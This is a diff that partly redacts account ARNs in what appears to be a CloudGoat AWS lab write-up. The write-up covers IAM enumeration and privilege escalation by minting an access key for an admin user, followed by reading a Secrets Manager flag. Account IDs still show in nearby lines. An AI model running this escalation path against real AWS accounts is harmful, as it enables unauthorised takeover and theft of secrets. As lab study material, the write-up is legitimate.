@@ -25,7 +25,7 @@ aws sts get-caller-identity --profile cloudgoat_beanstalk
 {
     "UserId": "AIDAVVYTW6AMEB4MKMQBX",
     "Account": "390346502168",
-    "Arn": "arn:aws:iam::390346502168:user/cgid40f7j9opmj_low_priv_user"
+    "Arn": "arn:aws:...."
 }
 ```
 
@@ -170,7 +170,7 @@ The `cgid40f7j9opmj_secondary_user`, whose credentials were recovered from the B
    ```bash
    aws sts get-caller-identity --profile cloudgoat_beanstalk_secondary
    aws iam list-attached-user-policies --user-name cgid40f7j9opmj_secondary_user --profile cloudgoat_beanstalk_secondary
-   aws iam get-policy-version --policy-arn arn:aws:iam::390346502168:policy/cgid40f7j9opmj_secondary_policy --version-id v1 --profile cloudgoat_beanstalk_secondary
+   aws iam get-policy-version --policy-arn arn:aws:iam::3..opmj_secondary_policy --version-id v1 --profile cloudgoat_beanstalk_secondary
    ```
 2. Enumerate all IAM users in the account using the granted `iam:ListUsers` permission:
    ```bash
@@ -203,7 +203,7 @@ $ aws sts get-caller-identity --profile cloudgoat_beanstalk_admin
 {
     "UserId": "AIDAVVYTW6AMDZ74YNV5U",
     "Account": "390346502168",
-    "Arn": "arn:aws:iam::390346502168:user/cgid40f7j9opmj_admin_user"
+    "Arn": "arn:aws:iam:...j_admin_user"
 }
 ```
 The secondary user's credentials were used to mint a brand-new, fully valid access key for the admin user — without ever needing to know or steal the admin's existing credentials.
@@ -261,7 +261,7 @@ Once administrative access was obtained via the `cgid40f7j9opmj_admin_user` cred
 #### Proof of Concept
 ```json
 {
-    "ARN": "arn:aws:secretsmanager:us-east-1:390346502168:secret:cgid40f7j9opmj_final_flag-3VhmCh",
+    "ARN": "arn:aws:se..._final_flag-3VhmCh",
     "Name": "cgid40f7j9opmj_final_flag",
     "VersionId": "terraform-20260607161732939900000002",
     "SecretString": "FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}",
